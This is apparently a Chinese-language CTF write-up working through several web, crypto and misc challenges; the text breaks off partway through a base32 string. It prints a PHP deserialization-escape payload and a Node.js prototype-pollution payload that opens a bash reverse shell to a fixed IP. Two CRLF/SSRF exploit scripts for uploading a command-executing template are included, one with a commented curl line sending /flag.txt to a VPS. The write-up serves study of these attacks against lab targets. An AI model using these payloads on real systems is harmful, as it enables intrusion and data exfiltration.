蚁剑连接小马之后在终端运行/readflag是没用的，利用phpinfo()发现是因为disable_functions把system给ban掉了：那就需要绕过限制，smity师傅比赛的时候就提醒需要用php_gc_uaf.php来绕过disable_functhions，一些绕过方法参考这里。把php_gc_uaf.php传到一个777权限的文件夹下，然后在浏览器端访问该文件即可拿到flag。 【补充】这个exp不用777权限的文件夹就能执行，web目录即可。高校战“疫”中的PHP-UAF就是用的这个。 babyPHP考察反序列化逃逸漏洞，这个之前在BUU上刷了一道类似的题目，不过更加复杂，比赛的时候没做出来，看了WP记录学习一下。 题目分析扫描后台可以发现存在源码www.zip，下载后是四个php文件，我们主要分析与拿flag相关的代码。首先从update.php中发现： if($_SESSION['login']===1){ require_once(\"flag.php\"); echo $flag;} 可以发现，登陆成功之后就可以拿到flag了。 然后审计关键文件lib.php，在其中发现如下代码： function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} 看到这里，就想到了之前在BUU上刷的[0CTF 2016]piapiapia，那道题考察的就是反序列化溢出漏洞，这也就是分析的关键了。再往下看，在UpdateHelper类中有一个反序列化点： Class UpdateHelper{ public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql){ $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); } public function __destruct() { echo $this-&gt;sql; }} 但是从代码中可以看到，此处用户可控的只有Info类中的两个属性age、nickname，不能完全控制序列化数据，无法注入对象。跟进User类中的反序列化点： public function update(){ $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']); //这个功能还没有写完 先占坑} 可以发现，反序列化的是getNewinfo()方法获取的内容，再来看一下getNewinfo()： public function getNewInfo(){ $age=$_POST['age']; $nickname=$_POST['nickname']; return safe(serialize(new Info($age,$nickname)));} 可以看到，对Info类的内容序列化之后，会先经过前面提到的safe()函数处理，然后才进行反序列化。这里就是构造反序列化逃逸的地方：通过写入黑名单中的字符\\字符串，在经过safe()函数处理的时候会替换为hacker，从而改变了长度，但是序列化的字符串，每一个属性的内容长度都是固定的，从而就可以利用替换关系构造出逃逸，然后注入对象。 整理一下构造pop链的思路： 利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来。 官方POC如下： &lt;?phpclass User{ public $id; public $age=null; public $nickname=null;}class Info{ public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname){ $this-&gt;age=$age; $this-&gt;nickname=$nickname; } }class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name='admin'; public $password; public $mysqli; public $token;}$d = new dbCtrl();$d-&gt;token='admin';$b = new Info('','1');$b-&gt;CtrlCase=$d;$a = new user();$a-&gt;nickname=$b;$a-&gt;age=\"select password,id from user where username=?\";$c=new UpdateHelper();$c-&gt;sql=$a;echo serialize($c);?&gt; 运行结果如下 O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}} 我们的目的是逃逸字符，因此需要保证payload进入之后能保证序列化字符串能够正常反序列化，正常的序列化字符串结构如下： O:4:\"Info\":3:{s:3:\"age\";s:5:\"ggb0n\";s:8:\"nickname\";s:7:\"ggb0n\";s:8:\"CtrlCase\";N;} 其中的age和nickname是我们可控的，那么我们就可以把payload写入到nickname部分，然后通过将payload挤出去进行逃逸，由于属性是三个，所以我们在nickname中写入的payload前面加一个CtrlCase的属性，在最后加一个}，如此以来，反序列化的时候就会忽略后面的CtrlCase，初步构造payload如下： \";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}} 下一步我们就需要把payload逃逸出去：由于payload一共454个字符，因此，我们需要构造黑名单中的内容，通过替换为hacker把payload挤出去，通过safe()函数我们可以知道，一个'替换为hacker可以替换挤出5个字符，一个union替换为hacker可以挤出1个字符，那么在payload前面加上90个'和4个union就可以把454个字符的payload挤出去了，构造最终payload如下： age=&amp;nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} 通过POST方式，将payload打入update.php即可拿到经过md5加密之后的password，解密即可。本道题是在BUU复现的，密码已经被改为了glzjin了，登录即可拿flag。 补充：smity师傅给了一个很详细的题解，可以好好学学这题：这里。 Ez_Express考察JS原型链污染，JS之前没学过，在BUU上复现的过程中慢慢学了一些，关于JS原型链的污染参考P神的文章。 题目分析进入题目，可以看到一些提示： 要求我们必须以ADMIN登录，但是这个用户又注册不了… dirsearch扫后台可以发现www.zip的存在，把源码拿下来，看看其中的玄机。 在index.js中的login路由下发现突破点： if(req.body.Submit==\"register\"){ if(safeKeyword(req.body.userid)){ res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\") } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); } 可以看到，在注册的时候存在toUpperCase()的使用，这个函数是存在可利用的漏洞的，即利用特殊字符进行绕过： toUpperCase():ı ==&gt; Iſ ==&gt; S 另外JS中的toLowerCase()函数也存在对特殊字符的不规范处理： toLowerCase():İ ==&gt; iK ==&gt; k 根据如上特性，我们可以利用admın身份进行注册，经过toUpperCase()处理便成了ADMIN从而成功登录： 可以看到，提示了flag的位置，应该就需要RCE来进行读取了。 再审代码，发现index.js中存在merge和clone，根据在前面提到的P神的文章中的学习，猜测应该是JS原型链污染： const merge = (a, b) =&gt; { for (var attr in b) { if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}const clone = (a) =&gt; { return merge({}, a);} 进一步在action路由下发现了clone的使用： router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")} req.session.user.data = clone(req.body); res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"); }) 是将req请求中的内容拼接到session的过程，显然，req.body是我们可控的，是考察原型链污染没错了。 action路由是啥时候访问的呢？其实就是提交输入的地方： 解题但是怎么才能实现原型链的污染呢？看到info路由下出现了outputFunctionName，参考另一篇文章，讲了利用outputFunctionName进行污染的方式，payload如下： {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\"');var __tmp2\"}} 大致含义就是： 利用对象的__proto__属性，向类的原型对象prototype中写入一个新的属性和属性值，即outputFunctionName和对应的值，如此以来，该类就存在了这个属性，实例化的时候也会继承，因此当我们再去访问info路由的时候res.outputFunctionName的值已经是我们写入的payload中的RCE部分的内容了，从而即可在VPS上反弹shell。 由于是在BUU上复现的，开一台内网主机，拿到ip之后构造payload： {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\\\"');var __tmp2\"}} 同时在该内网主机上进行监听，在访问action路由的时候抓包更改Content-Type为application/json，并将我们如上构造的payload写入： 前面就污染了原型链了，然后访问info路由进行命令的执行： 从而拿到shell： 然后就可以随便读取文件，拿到flag了。 有关JS的题目其实没怎么做过，因为还没有专门学过JS，但是JS确实越来用的越多，题也不少，很有学的必要。 Node Game又是一道JS的题，考察CRLF注入、SSRF CRLF注入参考这里： CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。 题目分析进入题目即可拿到源码： var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug'); //var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) { var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") ){ res.send(\"Errrrr, You have been Blocked\"); } file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);});//SSRFapp.post('/file_upload', function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); }else{ var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: 'upload success', filename: file_path + file_name } } catch (error) { obj.msg = 'upload failed'; } res.send(JSON.stringify(obj)); } })})app.get('/source', function(req, res) { res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) { var q = req.query.q; var resp = \"\"; if (q) { var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); } else { try { http.get(url, function(resp) { resp.setEncoding('utf8'); resp.on('error', function(err) { if (err.code === \"ECONNRESET\") { console.log(\"Timeout occurs\"); return; } }); resp.on('data', function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on('error', (e) =&gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }})function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } }}var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)}) 分析代码得知几个路由的用处： 1、 /：会包含/template目录下的一个pug模板文件来用pub进行渲染； 2、/source：回显源码； 3、/file_upload：限制了只能由IP为127.0.0.1进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录； 4、/core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。 但是/core路由下不能直接SSRF，而是需要利用Node js的编码安全问题（参考这里），对编码精心构造进行CRLF注入从而来进行SSRF，那么解题思路就明确了： 1、利用CRLF注入进行SSRF 2、利用SSRF伪造本地IP进行文件上传 3、上传包含命令执行代码的pug文件到/template目录 4、利用action参数包含文件，执行命令 解题参考上面文章可知，我们可以构造为\\u010D\\u010A来替换换行\\r\\n（%0D%0A），其他的一些特殊字符也如此构造，如空格(%20)构造编码为\\u0120，+(%2B)构造编码构造为\\u012B… 根据这个方式，构造拆分请求从而进行SSRF，参考网上师傅的exp： import requestspayload = \"\"\" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: {}Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt{}\"\"\".replace('\\n', '\\r\\n')body = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=\"file\"; filename=\"ggb0n.pug\"Content-Type: ../template-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--\"\"\".replace('\\n', '\\r\\n')payload = payload.format(len(body), body) \\ .replace('+', '\\u012b') \\ .replace(' ', '\\u0120') \\ .replace('\\r\\n', '\\u010d\\u010a') \\ .replace('\"', '\\u0122') \\ .replace(\"'\", '\\u0a27') \\ .replace('[', '\\u015b') \\ .replace(']', '\\u015d') \\ + 'GET' + '\\u0120' + '/'requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q=' + payload)print(requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n').text) 出题师傅的exp具有更高的灵活性： import requestsimport syspayloadRaw = \"\"\"x HTTP/1.1POST /file_upload HTTP/1.1Host: localhost:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942Content-Length: 6279Origin: http://localhost:8081Connection: closeReferer: http://localhost:8081/?action=uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name=\"file\"; filename=\"5am3_get_flag.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('evalcmd')-----------------------------12837266501973088788260782942--\"\"\"def getParm(payload): payload = payload.replace(\" \",\"%C4%A0\") payload = payload.replace(\"\\n\",\"%C4%8D%C4%8A\") payload = payload.replace(\"\\\"\",\"%C4%A2\") payload = payload.replace(\"'\",\"%C4%A7\") payload = payload.replace(\"`\",\"%C5%A0\") payload = payload.replace(\"!\",\"%C4%A1\") payload = payload.replace(\"+\",\"%2B\") payload = payload.replace(\";\",\"%3B\") payload = payload.replace(\"&amp;\",\"%26\") # Bypass Waf payload = payload.replace(\"global\",\"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC\") payload = payload.replace(\"process\",\"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"mainModule\",\"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5\") payload = payload.replace(\"require\",\"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5\") payload = payload.replace(\"root\",\"%C5%B2%C5%AF%C5%AF%C5%B4\") payload = payload.replace(\"child_process\",\"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"exec\",\"%C5%A5%C5%B8%C5%A5%C5%A3\") return payloaddef run(url,cmd): payloadC = payloadRaw.replace(\"evalcmd\",cmd) urlC = url+\"/core?q=\"+getParm(payloadC) requests.get(urlC) requests.get(url+\"/?action=5am3_get_flag\").textif __name__ == '__main__': targetUrl = sys.argv[1] cmd = sys.argv[2] print run(targetUrl,cmd)# python exp.py http://127.0.0.1:8081 \"curl vps-ip:port -X POST -d `cat /flag.txt`\" 同志仍需努力啊！ 参考：https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game Crypto-Easy_RSA考察共模攻击 解题给的附件内容如下： n = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664 这就很明显了，对相同的明文，利用相同的模数n，不同的e进行加密，显然的共模攻击。直接上脚本了： import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a)个字符 return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) 关于RSA攻击的一些常见题目，可以参考这里。 Crypto-warm_up一道RSA攻击题，比赛的时候用了很久的时间，结果方法是那个方法，也没毛病，但是拿到的中间解密结果就是跟正确的不一样…【补充】后来得知是利用Rabin算法来解密， 题目分析首先拿到加密的脚本：challenge： from Crypto.Util.number import *from encode import KEYq=getPrime(1024)p=getPrime(1024)r=getPrime(1024)s=getPrime(1500)e1=125794e2=42373n1=p*q# p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599# q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279n2=p*r# r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829n3=p*q*s# s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546c1=pow(s,e1,n1)Key=int(KEY.encode('hex'),16)key_encode=pow(Key,e2,n3)with open(\"enc\",\"a\")as f: f.write(\"c1: \"+str(c1)+\"\\n\") f.write(\"n1: \"+str(n1)+\"\\n\") f.write(\"n2: \"+str(n2)+\"\\n\") f.write(\"key_encode: \"+str(key_encode)+\"\\n\") encode： from flag import flagimport osKEY = os.urandom(len(flag))dec=int(flag.encode('hex'),16)assert len(bin(dec)[2:])==335mask=int('1'*335,2)dec=(dec^dec&lt;&lt;200 )&amp;maskenc=dec^bytes_to_long(KEY)print \"enc: \"+str(enc)#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809 审计代码可知，要拿到flag，我们首先需要拿到KEY，而KEY是经过RSA加密的。但是观察RSA代码发现n1和n2有公约数p，利用欧几里何算法即可求得： def gcd(m,n): if n==0: #考虑特殊情况 print(\"n is not equal 0!\") else: while m%n!=0: new=m m=n n=new%n return n 这样我们就有了p、q、r，但是要得到KEY，我们需要拿到s，这个地方参考了网上的一篇文章中的一部分来求，但是求得的s不是1500bit、但是加密的密文却是一样的…然后也就没有做下去了，等WP吧…后来一位师傅分享了自己的总结，学习下吧：http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa师傅给了他的脚本做参考，但是还没完全搞明白，等WP出来研究好了再补充。 补充利用Rabin算法解密RSA部分，然后利用运算的特性将dec=(dec^dec&lt;&lt;200)&amp;mask通过dec=(dec^dec&gt;&gt;200)&amp;mask进行还原，解密脚本如下： import gmpy2import libnumc1 = 9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855n1 = 15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121n2 = 16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571key_encode = 154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993p = gmpy2.gcd(n1, n2)q = n1/pe1 = 125794e2 = 42373b = gmpy2.gcd(e1, (p-1)*(q-1))bd = gmpy2.invert(e1/b, (p-1)*(q-1))s = pow(c1, bd, n1)u = pow(s,(p+1)/4,p)v = pow(s,(q+1)/4,q)s = gmpy2.invert(p,q)t = gmpy2.invert(q,p)x = (t*q*u+s*p*v)%n1x2 = -x%n1y = (t*q*u-s*p*v)%n1y2 = -y%n1might_s = [x, x2, y, y2]might_d = []for i in might_s: might_d.append(int(gmpy2.invert(e2, (p-1)*(q-1)*(i-1))))might_key = []for i in range(4): might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])enc = 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809key = 42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276dec = key^encprint libnum.n2s(dec)mask = int('1'*335,2)dec = (dec ^ dec&gt;&gt;200)&amp;maskprint libnum.n2s(dec) Misc-code_in_morse考察基本的流量分析、morse编码，base32解码转图片，PDF417图片的识别以及F5隐写。 题目分析拿到流量包之后导出HTTP数据，发现一共四个文件，在PNG文件中拿到了morse码，到网站解码得到一串base32码，这个时候到网站上解base32解不出来，就用python解了一下，发现是一堆hex，其中还有PNG字样，断定是图片的数据，写了个脚本导入到png图片： import base64import binasciib32 = \"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUP